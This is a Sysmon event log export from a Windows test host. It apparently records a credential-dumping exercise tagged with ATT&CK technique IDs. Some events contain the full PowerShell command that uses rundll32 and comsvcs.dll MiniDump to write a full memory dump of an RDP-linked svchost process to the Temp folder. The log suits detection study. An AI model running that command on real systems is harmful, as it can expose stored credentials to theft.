Level,Date and Time,Source,Event ID,Task Category
Information,04/01/2025 11:20:10,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1003.004,technique_name=LSASS Memory
UtcTime: 2025-01-04 11:20:10.016
ProcessGuid: {cc4d60af-1969-6779-c447-000000000900}
ProcessId: 6864
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\Windows\System32\comsvcs.dll
FileVersion: 2001.12.10941.16384 (WinBuild.160101.0800)
Description: COM+ Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: COMSVCS.DLL
Hashes: SHA1=88164F557A849B3A55CB55041767037868637BF8,MD5=D6E6665B87AE3C14D1E896900A43805B,SHA256=41445E53087606155EE68A8820026FB72902F537A8AF0D932AB12AE5110528BE,IMPHASH=841815811E3818A9D0E957F8EC0D3D06
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:10,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1003,technique_name=Credential Dumping
UtcTime: 2025-01-04 11:20:10.048
SourceProcessGUID: {cc4d60af-1969-6779-c447-000000000900}
SourceProcessId: 6864
SourceThreadId: 9824
SourceImage: C:\Windows\System32\rundll32.exe
TargetProcessGUID: {cc4d60af-cedf-6759-1500-000000000900}
TargetProcessId: 464
TargetImage: C:\Windows\System32\svchost.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d9b4|C:\Windows\SYSTEM32\ntdll.dll+d787a|C:\Windows\System32\KERNEL32.DLL+1e20c|C:\Windows\System32\KERNEL32.DLL+2921e|C:\Windows\SYSTEM32\dbgcore.DLL+e681|C:\Windows\SYSTEM32\dbgcore.DLL+1d3d5|C:\Windows\SYSTEM32\dbgcore.DLL+16e45|C:\Windows\SYSTEM32\dbgcore.DLL+63ee|C:\Windows\SYSTEM32\dbgcore.DLL+6ebb|C:\windows\System32\comsvcs.dll+27502|C:\Windows\System32\rundll32.exe+46ab|C:\Windows\System32\rundll32.exe+a029|C:\Windows\System32\KERNEL32.DLL+17374|C:\Windows\SYSTEM32\ntdll.dll+4cc91
SourceUser: DESKTOP-Q6SIUBL\xxx
TargetUser: NT AUTHORITY\NETWORK SERVICE"
Information,04/01/2025 11:20:10,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2025-01-04 11:20:10.048
ProcessGuid: {cc4d60af-1969-6779-c447-000000000900}
ProcessId: 6864
Image: C:\Windows\System32\rundll32.exe
TargetFilename: C:\Users\xxx\AppData\Local\Temp\svchost-exe.dmp
CreationUtcTime: 2025-01-04 11:20:10.048
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:10,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2025-01-04 11:20:10.001
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-2271799426-3438397038-4151184888-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:09,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2025-01-04 11:20:09.985
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\xxx\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2025-01-04 11:17:37.313
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:09,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2025-01-04 11:20:09.954
SourceProcessGUID: {cc4d60af-1967-6779-c147-000000000900}
SourceProcessId: 7576
SourceThreadId: 6920
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {cc4d60af-1969-6779-c447-000000000900}
TargetProcessId: 6864
TargetImage: C:\Windows\System32\rundll32.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9ee04|C:\Windows\System32\KERNELBASE.dll+53715|C:\Windows\System32\KERNELBASE.dll+50756|C:\Windows\System32\KERNEL32.DLL+1cef4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\acc30bc70b54b35ac1a841482f4edefb\System.ni.dll+3512f6|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\acc30bc70b54b35ac1a841482f4edefb\System.ni.dll+2b3c49|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\acc30bc70b54b35ac1a841482f4edefb\System.ni.dll+2b35b9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\6307158ab9c2a3fca14b25a29c535c3e\System.Management.Automation.ni.dll+12a91e9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\6307158ab9c2a3fca14b25a29c535c3e\System.Management.Automation.ni.dll+11bf73a|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\6307158ab9c2a3fca14b25a29c535c3e\System.Management.Automation.ni.dll+126addd|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\6307158ab9c2a3fca14b25a29c535c3e\System.Management.Automation.ni.dll+126aa9b|C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\6307158ab9c2a3fca14b25a29c535c3e\System.Management.Automation.ni.dll+13409cf|UNKNOWN(00007FFB79003651)
SourceUser: DESKTOP-Q6SIUBL\xxx
TargetUser: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:09,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1218.011,technique_name=rundll32.exe
UtcTime: 2025-01-04 11:20:09.944
ProcessGuid: {cc4d60af-1969-6779-c447-000000000900}
ProcessId: 6864
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.4648 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 464 C:\Users\xxx\AppData\Local\Temp\svchost-exe.dmp full
CurrentDirectory: C:\Users\xxx\AppData\Local\Temp\
User: DESKTOP-Q6SIUBL\xxx
LogonGuid: {cc4d60af-e97e-6759-6232-900000000000}
LogonId: 0x903262
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=34661F530C6BC94AA1F307DF30F75733E5D87382,MD5=D28778D07C8F7CA59B7569E4EDA54512,SHA256=770832DA77324F205306B4D89C02BA2B98DCE87207A82D4BF9B1D076608862D6,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ParentProcessId: 7576
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}
ParentUser: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:09,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1047,technique_name=Windows Management Instrumentation
UtcTime: 2025-01-04 11:20:09.735
ProcessGuid: {cc4d60af-1969-6779-c347-000000000900}
ProcessId: 3652
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
ImageLoaded: C:\Windows\System32\wbem\wmiutils.dll
FileVersion: 10.0.19041.4474 (WinBuild.160101.0800)
Description: WMI
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: wmiutils.dll
Hashes: SHA1=B0A2BB829A84EBD3AE771C7827DFB18A769CFA4F,MD5=772DC322542BA8EB2FDF4242C54DDECA,SHA256=460C31B0EAB2954B5FB3B2E30BA47C1A0BC5EA972108FF4B42D3BB5A5A42E3F5,IMPHASH=0D31E6D27B954AD879CB4DF742982F1A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\NETWORK SERVICE"
Information,04/01/2025 11:20:09,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1047,technique_name=Windows Management Instrumentation
UtcTime: 2025-01-04 11:20:09.647
ProcessGuid: {cc4d60af-1969-6779-c347-000000000900}
ProcessId: 3652
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {cc4d60af-cedf-6759-e403-000000000000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=7F530281C5BA86B81AE4230DAB1617CB55260D9E,MD5=8BB61C2B1E34FF3C778CF150BDF08238,SHA256=8BBDEAD7357AF7BF0EFE397F9FD7E0EC578755EB8BDBAA65AE4F28EF00087AD5,IMPHASH=B71CB3AC5C352BEC857C940CBC95F0F3
ParentProcessGuid: {cc4d60af-cede-6759-0d00-000000000900}
ParentProcessId: 908
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
Information,04/01/2025 11:20:09,Microsoft-Windows-Sysmon,3,Network connection detected (rule: NetworkConnect),"Network connection detected:
RuleName: technique_id=T1036,technique_name=Masquerading
UtcTime: 2025-01-04 11:19:23.204
ProcessGuid: {cc4d60af-cee3-6759-4f00-000000000900}
ProcessId: 3400
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe
User: NT AUTHORITY\SYSTEM
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.153.4
SourceHostname: -
SourcePort: 54307
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 51.105.216.71
DestinationHostname: -
DestinationPort: 443
DestinationPortName: -"
Information,04/01/2025 11:20:09,Microsoft-Windows-Sysmon,3,Network connection detected (rule: NetworkConnect),"Network connection detected:
RuleName: technique_id=T1036,technique_name=Masquerading
UtcTime: 2025-01-04 11:19:23.163
ProcessGuid: {cc4d60af-cee3-6759-4f00-000000000900}
ProcessId: 3400
Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe
User: NT AUTHORITY\SYSTEM
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.153.4
SourceHostname: -
SourcePort: 54306
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 51.105.216.71
DestinationHostname: -
DestinationPort: 443
DestinationPortName: -"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2025-01-04 11:20:08.282
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MpClient.dll
FileVersion: 4.18.24090.11 (26d75470953920f90fd0438874501e9d9a31e621)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=B87C8A2B39166043E28DE0A64FC53E060FEE7CAE,MD5=F829FD84B8E3F3549103C1C5774A60E1,SHA256=FA1125BD8CDBB13C6CED323A737672DDC5C2B396210035D6E524E86A77272C07,IMPHASH=B9197178CCCE2C42C926E2A72C2A6BED
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2025-01-04 11:20:08.220
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9282.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7A25AF21D2DDD330535A34A4210DB1CD2BA0AA94,MD5=3E39EF1226D09D39B1361F44FDDE2F3A,SHA256=300CD0FAAAB4664D43C72C3AEB0AA7332BB93B4268088407C1AE4D025D44EA7B,IMPHASH=F2AFE1578B0645F42EFCA5A3FB0CE765
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2025-01-04 11:20:08.204
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
PipeName: \PSHost.133804632077483009.7576.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2025-01-04 11:20:08.173
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
User: DESKTOP-Q6SIUBL\xxx
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\xxx\AppData\Local\Temp\__PSScriptPolicyTest_kem51sum.lat.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-01-04 11:20:08.126
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\xxx\AppData\Local\Temp\__PSScriptPolicyTest_kem51sum.lat.ps1
CreationUtcTime: 2025-01-04 11:20:08.126
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2025-01-04 11:20:08.110
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MpOAV.dll
FileVersion: 4.18.24090.11 (26d75470953920f90fd0438874501e9d9a31e621)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=F2D73FFE3A240FF5F0B30FFE05EB72E52A28B912,MD5=53F017C0946F9B96A1C1A2E63BCB8CEC,SHA256=45D3B9A1B0D0FB10CEBFC970F4FDC822516AF88BBE0D310E00441432F191B0CB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2025-01-04 11:20:08.079
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\6307158ab9c2a3fca14b25a29c535c3e\System.Management.Automation.ni.dll
FileVersion: 10.0.19041.5247
Description: System.Management.Automation
Product: Microsoft (R) Windows (R) Operating System
Company: Microsoft Corporation
OriginalFileName: System.Management.Automation.dll
Hashes: SHA1=BDD39605C8B9ABF01C8EE47646D273519F9EFB1C,MD5=6586920C331586ADD3B41A009D65140B,SHA256=CEF16F037188E9EAE4970DA559BF2BCA71FF2448EE547ADA958F4F88EFE5E6FC,IMPHASH=00000000000000000000000000000000
Signed: false
Signature: -
SignatureStatus: Unavailable
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2025-01-04 11:20:08.048
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\assembly\NativeImages_v4.0.30319_64\mscorlib\9a860ac99a94a0422dc04d0dd9b0e341\mscorlib.ni.dll
FileVersion: 4.8.9282.0 built by: NET481REL1LAST_C
Description: Microsoft Common Language Runtime Class Library
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscorlib.dll
Hashes: SHA1=934A60242F1FC4864D74B276427E6DFC69F77F3E,MD5=762EB0F86A72D5DD9130DDC4849F03EF,SHA256=F2ED2622AB213A3A3D9702A8CCC0BE087B7D9308DD953F9C10D435599DC1800B,IMPHASH=00000000000000000000000000000000
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2025-01-04 11:20:08.032
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9282.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA1=B12C4496FBB3EC12B183E79E38EB456482F4D49C,MD5=1911979D17F27BADA24BD6A42F93D43F,SHA256=707564FC98C58247D088183731C2E5A0F51923D6D9A94646B0F2158EB5704DF4,IMPHASH=01E0958B232430E87E27DC8010111684
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2025-01-04 11:20:08.032
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscoreei.dll
Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:08,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2025-01-04 11:20:08.016
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:07,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2025-01-04 11:20:07.766
SourceProcessGUID: {cc4d60af-138c-6779-1147-000000000900}
SourceProcessId: 9076
SourceThreadId: 9696
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {cc4d60af-1967-6779-c147-000000000900}
TargetProcessId: 7576
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9ee04|C:\Windows\System32\KERNELBASE.dll+53715|C:\Windows\System32\KERNELBASE.dll+50756|C:\Windows\System32\KERNEL32.DLL+1cef4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\acc30bc70b54b35ac1a841482f4edefb\System.ni.dll+3512f6|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\acc30bc70b54b35ac1a841482f4edefb\System.ni.dll+2b3c49|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\acc30bc70b54b35ac1a841482f4edefb\System.ni.dll+2b35b9|UNKNOWN(00007FFB79B8BD95)
SourceUser: DESKTOP-Q6SIUBL\xxx
TargetUser: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:07,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2025-01-04 11:20:07.748
ProcessGuid: {cc4d60af-1967-6779-c147-000000000900}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}
CurrentDirectory: C:\Users\xxx\AppData\Local\Temp\
User: DESKTOP-Q6SIUBL\xxx
LogonGuid: {cc4d60af-e97e-6759-6232-900000000000}
LogonId: 0x903262
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {cc4d60af-138c-6779-1147-000000000900}
ParentProcessId: 9076
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-Q6SIUBL\xxx"
Information,04/01/2025 11:20:07,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2025-01-04 11:20:07.766
ProcessGuid: {cc4d60af-138c-6779-1147-000000000900}
ProcessId: 9076
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-2271799426-3438397038-4151184888-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-Q6SIUBL\xxx"
